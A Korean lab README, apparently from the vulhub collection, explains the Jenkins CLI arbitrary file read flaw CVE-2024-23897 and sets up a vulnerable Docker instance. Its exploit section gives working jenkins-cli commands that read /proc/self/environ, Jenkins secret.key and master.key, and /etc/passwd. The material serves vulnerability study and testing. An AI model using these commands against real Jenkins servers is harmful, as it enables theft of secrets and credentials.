# CLI를 이용한 Jenkins 임의 파일 읽기 취약점(CVE-2024-23897)


Jenkins는 오픈소스로 지속적 통합 서비스를 제공하는 도구입니다.(자동화 서버)입니다.
Jenkins에서는 [args4j library](https://github.com/kohsuke/args4j)를 사용하여 CLI 명령을 처리할 때 Jenkins 컨트롤러의 명령 인수와 옵션을 구문 분석합니다. 
이 명령 구문 분석기 @에는 인수의 문자와 파일 경로를 파일 내용(expandAtFiles)로 바꾸는 기능이 있어 공격자가 Jenkins 서버에서 임의의 파일을 읽도록 유도합니다.

Jenkins 버전은 2.441 이고 이전 버전에 모두 영향을 미칩니다.

참고 자료 :
- <https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897>
- <https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314>
- <https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw>

## 취약한 환경 시작
docker-compose.yml 가 존재하는 디렉토리에서

```
docker compose up -d
```
이후
'http://your-ip:8080/' 서버가 시작된 이후에 jenkins 서버에 접속할 수 있습니다. 기본 관리자 사용자 이름과 비밀번호는 'admin'과 'vulhub'입니다.

## 익스플로잇
먼저 'jenkins-cli.jar' 파일을 다운로드 합니다. 'http://localhost:8080/jnlpJars/jenkins-cli.jar'


파일을 읽어 '/pro/self/environ' Jenkins 기본 디렉토리를 가져옵니다. 'JENKINS_HOME=/var/jenkins_home'
```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/proc/self/environ"
```
<img width="452" alt="1" src="https://github.com/dhsgud/jenkins/assets/61280812/058305eb-ae95-4501-b061-5279f608bdd9">

다음 'secret.key' 또는 'master.key'와 같은 중요한 파일을 검색하는데 사용할 수 있습니다.(명령줄 오류를 통해 파일의 첫 번째 줄만 읽을 수 있습니다.):

```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins_home/secret.key"
```
<img width="452" alt="2" src="https://github.com/dhsgud/jenkins/assets/61280812/8746beab-e932-4e61-b3bf-fab4f8fefa19">

```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins_home/secrets/master.key"
```
<img width="452" alt="3" src="https://github.com/dhsgud/jenkins/assets/61280812/22c07fdc-6f35-44c0-9f77-631e84637e56">

"익명 읽기 액세스 허용"이 설정되어 있으므로 파일의 전체 내용을 읽을 수도 있습니다 :

```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node "@/etc/passwd"
```

<img width="452" alt="4" src="https://github.com/dhsgud/jenkins/assets/61280812/064d1f0e-a72a-4a69-b2f2-939439aaa379">
